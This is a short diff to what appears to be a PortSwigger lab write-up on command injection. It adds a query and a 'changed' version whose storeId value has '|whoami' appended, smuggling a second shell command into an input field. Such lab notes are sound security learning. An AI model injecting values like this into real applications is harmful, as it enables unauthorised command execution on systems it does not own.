@@ -11,9 +11,14 @@
 Query made--
 
 ```sql
-
+SELECT * FROM your_table_name WHERE productId = 13 AND storeId = 1;
 ```
 
+Changed Query--
+
+```sql
+SELECT * FROM your_table_name WHERE productId = 13 AND storeId = 1|whoami;
+```
 
 ![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/aae2468e-fedd-42ac-9c38-90940406cb48)
 
